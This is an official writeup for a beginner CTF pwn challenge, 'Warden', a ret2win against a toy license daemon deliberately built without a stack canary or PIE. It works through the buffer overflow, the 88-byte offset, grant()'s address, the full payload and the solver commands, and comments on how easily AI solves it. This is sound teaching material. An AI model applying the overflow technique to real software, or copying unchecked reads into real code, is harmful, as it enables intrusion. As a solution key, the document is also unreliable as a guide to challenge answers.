# Warden — solution

Run commands from this challenge's title directory. Python dependencies, when needed, are in `solution/requirements.txt`.

`accepted_flags.txt` records the accepted event answers. Locally reproduced services use their source defaults unless a flag is supplied through the documented environment variable; those demo answers can differ from the event answer.

# Warden — official writeup

**Category:** pwn · **Honest difficulty band:** Easy–Medium (a textbook ret2win).
**CWE:** CWE-121 (stack-based buffer overflow), CWE-787 (out-of-bounds write).

This is a deliberately classic, self-contained teaching binary. The reference
exploit is a fixed-offset return-address overwrite against *this toy binary
only* — it is not a technique against any real software, and it relies on
mitigations (PIE, stack canary) being switched off at compile time precisely so
that the mechanics are visible to a beginner.

---


## The mechanism

`main()` declares a 64-byte on-stack buffer and reads up to 256 bytes into it:

```c
#define FIELD_LEN 64
#define SUBMISSION_LEN 256
...
char field[FIELD_LEN];
ssize_t n = take_submission(field);   // read(0, field, 256)
```

`read(0, field, 256)` happily writes up to 256 bytes into a 64-byte buffer. Past
the end of `field` lies the saved frame pointer and then `main()`'s saved return
address. Overwriting that return address redirects control when `main()` returns.

The binary also contains `grant()`, the routine that discloses the feature token
(the flag). On the ordinary verdict path `grant()` is never called — but it is
still in the image, and because the binary is built `-no-pie` it is at a fixed
address. Redirecting the saved return address to `grant()` wins.

---


## Offset derivation 

Build the reference binary and read the frame off the disassembly:

```
$ gcc -O0 -fno-stack-protector -no-pie -fcf-protection=none -Wall -o warden warden.c
$ objdump -d warden | grep -A3 '<main>:'
  ...
  40130a:  48 83 ec 50        sub    $0x50,%rsp          # 0x50-byte frame
  ...
  401377:  48 8d 45 b0        lea    -0x50(%rbp),%rax     # &field  == rbp-0x50
  ...                         call   <take_submission>    # read into field
```

Stack frame, from low to high address:

```
rbp-0x50  +----------------------+  <- field  (start of the 64-byte buffer)
          |      field[64]       |
          |   (+ slack to rbp)   |   0x50 = 80 bytes from field up to saved RBP
rbp+0x00  +----------------------+  <- saved RBP        (8 bytes)
rbp+0x08  +----------------------+  <- saved return addr  <-- overwrite target
          +----------------------+
```

- `field` is at `rbp-0x50`, i.e. **0x50 = 80 bytes** below the saved RBP.
- The saved RBP occupies 8 bytes; the return address sits immediately above it.
- Therefore the offset from the start of `field` to the saved return address is
  **80 + 8 = 88 bytes**.

Empirically confirmed with a one-byte sweep (only 88 reaches `grant()`; 87 and 89
crash with SIGSEGV, proving the offset is exact):

```
off 86  rc -11  -
off 87  rc -11  -
off 88  rc  0   WIN
off 89  rc -11  -
```

`grant()`'s address in the reference build:

```
$ nm warden | grep ' grant'
00000000004011df T grant
```

(The same address is produced by the Debian `gcc` used in the deploy image and by
the Ubuntu `gcc` used by the test harness — the `-O0 -no-pie` layout is stable
across those toolchains. The reference solver resolves it from the ELF symbol
table for `--local` anyway, so a future toolchain change cannot silently break it.)

---


## The payload

```
payload = b"A" * 88  +  struct.pack("<Q", 0x4011df)
#         |__________|   |_____________________|
#          padding to     grant(), little-endian 8-byte address
#          the ret slot
```

96 bytes total. Deliver it as the license submission; when `main()` returns,
execution continues at `grant()`:

```
[warden] license declined: key not recognised for this appliance.
[warden] session closed.
[warden] license activated -- premium features unlocked.
[warden] feature token: zerosecurectf{...}
```

(The "declined / session closed" lines come from `main()` finishing its body
*before* it returns into `grant()`.)

### Why `write()` and not `printf()` in grant()

`grant()` emits the flag with raw `write(2)` calls and ends with `_exit(0)`. This
sidesteps the classic "`movaps` on a 16-byte-misaligned stack" crash that can
bite a ret2win when the hijacked routine calls into `printf`/libc that assumes
ABI stack alignment. It makes the win deterministic regardless of the exact
alignment at the moment of the hijack, so the reference exploit returns a clean
exit code 0 every time.

---


## Steps (player view)

1. `nm ./warden | grep grant`  → `grant()` at `0x4011df`.
2. Offset from the buffer to the saved return address = 88 (see above).
3. `python3 solution/solve.py --remote <host> <port>` (or `--local build/warden`).

---


## Integrity / why benign input cannot win

- A short, well-formed submission never reaches the return address, so `main()`
  returns normally and the process exits without ever touching `grant()`. The
  acceptance test asserts this (`benign short submission ... prints no flag`).
- A payload that stops even one byte short of offset 88 does **not** reach
  `grant()` — asserted too.
- The flag is read from `ZSCTF_FLAG` at the instant `grant()` runs; it is never
  compiled into the binary. The only flag-shaped string in the image is the
  clearly-marked `zerosecurectf{REPLACE_ME_AT_DEPLOY}` placeholder used when the
  operator forgot to provision one. The test asserts the *configured* flag is
  absent from the binary.

---


## Honest RED-TEAM / AI-RESISTANCE

This is the easiest-to-recognise bug class in binary exploitation, so we make no
claim of AI resistance. An unaided LLM with tool access (or even without) will
classify this immediately and produce a working exploit:

- **Recognisability:** source is provided, mitigations are off, there is a
  conspicuously named `grant()` that prints the flag and is never called. Any
  competent solver (human or model) reads this as "ret2win" in seconds.
- **Automated tooling trivialises it:** `pwntools`
  (`ELF(...).symbols['grant']`, `cyclic`/`cyclic_find` for the offset) or
  angr/one-gadget-style tooling solve it with near-zero human effort. We even
  ship a from-scratch `struct.pack` solver to show no framework is needed.
- **No real-world transfer:** the exploit is a hard-coded offset and a fixed
  address against this single toy binary. It is not a weaponizable primitive
  against any production software; disabling PIE/canary is exactly what makes it
  a lesson rather than a weapon.
- **Why keep it anyway:** it is the on-ramp. A CTF needs a correct, clean,
  honestly-labelled ret2win so first-time pwners learn the stack-frame model,
  the little-endian address write, and the `-no-pie` fixed-address idea before
  meeting canaries, PIE+leak, and ROP. Its value is pedagogical, and it is banded
  Easy–Medium accordingly — not inflated.

**Hardening knobs (if a harder variant is ever wanted), roughly in order:**
strip the binary (players recover `grant()` by disassembly → still Easy);
turn the canary on and add a separate leak; enable PIE and require an address
leak first; remove `grant()` and force a short ROP chain / `ret2libc`. Each is a
documented difficulty step, not a patch to this intro instance.

---


## Design notes (for the ZSCTF team)

- **Lineage (corpus reconstruction, system.html §17).** Donated from the pwn
  anchor cruxes (`zsctf-anchor-001 unexploitable`, and the `zsctf-pwn-*`
  competition seeds, which are all L4/L5 kernel/VMM/heap targets) via two §17
  operators:
  - **GROUND** — take the "binary exploitation (stack)" crux down to the single
    most teachable primitive: a fixed-offset saved-return-address overwrite to an
    in-binary `win` routine, on a self-contained userspace toy.
  - **CONSTRAIN** — strip away every amplifier that makes the seeds frontier-hard
    (no ASLR/PIE, no canary, no leak stage, no ROP, no remote kernel): the
    challenge is *only* the overflow-to-`grant` step. The constraint is the point.
- **Framing** is a benign "license daemon reading a fixed-size field without a
  bounds check," matching the brief; CWE-121 / CWE-787.
- **Per-instance** variation is the flag only (env). The binary is intentionally
  identical for all teams (a leaked offset/address is expected — it is public in
  the handed-out binary); isolation is per-exploit at the container boundary.
  runs the real solver to assert the configured flag, asserts benign/short input
  cannot win, asserts the precise offset (one byte short fails), asserts the
  configured flag is not in the binary, asserts determinism (byte-identical
  rebuild + repeatable win), and exercises the TCP front-end. On Windows it runs
  this Linux body inside WSL; the deploy image rebuilds the same binary with
  Debian `gcc`.

## Local binary

The event backup omitted the downloadable binary. `challenge/warden` is a Linux x86-64 rebuild from the archived challenge source. It uses the same documented build flags; it is not claimed to be byte-identical to the event host.

```bash
python solution/solve.py --local challenge/warden
```
